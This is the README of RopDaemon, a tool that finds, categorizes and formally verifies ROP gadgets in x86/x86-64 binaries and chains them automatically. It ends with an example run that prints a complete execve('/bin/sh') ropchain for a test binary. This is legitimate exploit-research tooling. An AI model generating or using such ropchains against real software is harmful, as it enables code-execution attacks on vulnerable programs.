# RopDaemon

A fast, multithreaded, ROP-gadget semantics analyzer.

`RopDaemon` collects and analyses all the ROP gadgets in a program and assigns them a gadget category and multiple metadata, including:

* The address and the opcodes in the gadget
* The basic operation performed by the gadget, and the registers involved
* The registers invalidated/clobbered by the gadget
* The effect of the gadget on the stack pointer
* If the gadget accesses memory and how

Moreover, `RopDaemon` can reason on the gadgets by automatically crafting non-trivial ropchains.
It supports `x86` and `x86-64` binaries.

## Gadget Categorization

| CLASS | DESCRIPTION | EXAMPLE |
| --- | --- | --- |
| LoadConst | Load constant value into a register | pop rax; ret |
| ClearReg | Set to zero a register | xor rax, rax; ret |
| MovReg | Copy value from a register to a register | mov rax, rcx; ret |
| UnOp | Unary arithmetic/logical oper. over a register | inc rax; ret |
| BinOp | Binary arithmetic/logical oper. over registers | add rax, rbx; ret |
| ReadMem | Read value from memory | mov rax, qword ptr [rcx + 8]; ret |
| WriteMem | Write value into memory | mov qword ptr [rcx + 8], rax; ret |
| ReadMemOp | Binary operation with memory input | add rax, qword ptr [rcx + 8]; ret |
| WriteMemOp | Binary operation with memory output | add qword ptr [rcx + 0x10], rax; ret |
| StackPtrOp | Alter stack pointer value | add rsp, 8; ret |
| Other | Any other operation | syscall; ret |

Gadgets are initially collected by [ropper](https://github.com/sashs/Ropper).
All valid gadgets are executed under [unicorn](https://www.unicorn-engine.org/) using random input values in the registers. This allows `RopDaemon` to collect the gadgets that are candidates for interesting operations. All the others are quickly discarded.

`RopDaemon` verifies only the interesting gadgets using the [angr](https://angr.io/) framework.

## Chain crafting

`RopDaemon` is able to craft non-trivial ropchains using graph based algorithms. It supports setting registers to fixed values, writing to memory, calling functions and syscalls.

It creates a graph based on gadgets dependencies to express the effect each gadget execution has on the registers/memory state, including registers that must be valid (since dereferenced) and registers clobbered by the gadget execution.
A query is then a simple visit on the graph.

## Install

``` shell
$ python3 setup.py install
```

## Usage

``` shell
$ ropd --help                                                                                                                                                                                           
usage: ropd [-h] [-c] [-v] [-e] [-d] [-j] [--stats] binary

This is RopDaemon, a fast rop-gadget compiler

positional arguments:
  binary         input binary

optional arguments:
  -h, --help     show this help message and exit
  -c, --collect  collect and categorize gadgets
  -v, --verify   formally verify collected gadgets
  -e, --execve   generate a ropchain to perform an execve("/bin/sh") syscall
  -d, --dump     dump gadgets file to a readable format
  -j, --json     dump gadgets file to json format
  --stats        statistics about verified gadgets
```

* Run `ropd -cv <binary>` to collect and verify the gadgets in `<binary>`.
  Collection and Verification phases have to be run just once per binary. `RopDaemon` will create a `<binary>.collected` and `<binary>.verified` file to cache the results.
* Run `ropd -j <binary>` to dump a `json` file with all the verified gadgets for `<binary>`.
* Run `ropd -e <binary>` to produce an `execve("/bin/sh")` chain from `<binary>`.

### Example

``` shell
$ ropd -cve test/baby_stack
Collecting...
Analyzing...
100%|██████████████████████| 12314/12314 [00:33<00:00, 366.67it/s]
Found 2318 different typed gadgets
Collected gadgets saved in test/baby_stack.collected
Verifying...
100%|██████████████████████| 2055/2055 [00:21<00:00, 96.91it/s]
Found 1841 different verified gadgets
Verified gadgets saved in test/baby_stack.verified
[+] found best guesses for: ['rax', 'rcx', 'rsi', 'rbp', 'rbx', 'rdx', 'rdi']
[+] computing sequence

IMAGE_BASE =  0x0
rebase = lambda x : p64(x + IMAGE_BASE)

rop = ''
rop += rebase(0x4016ea) # pop rax; ret
rop += p64(0x5a6830)
rop += rebase(0x409d68) # pop rbx; and byte ptr [rax + 1], cl; ret
rop += p64(0x5bf058)
rop += rebase(0x43730f) # pop rbp; ret
rop += p64(0x68732f6e69622f) # "/bin/sh\x00"
rop += rebase(0x40631a) # mov qword ptr [rbx], rbp; ret
rop += rebase(0x470931) # pop rdi; or byte ptr [rax + 0x39], cl; ret
rop += p64(0x5bf058)
rop += rebase(0x46ec93) # pop rdx; adc byte ptr [rax - 1], cl; ret
rop += p64(0x0)
rop += rebase(0x4016ea) # pop rax; ret
rop += p64(0x3b)
rop += rebase(0x46defd) # pop rsi; ret
rop += p64(0x0)
rop += rebase(0x456889) # syscall ; ret
```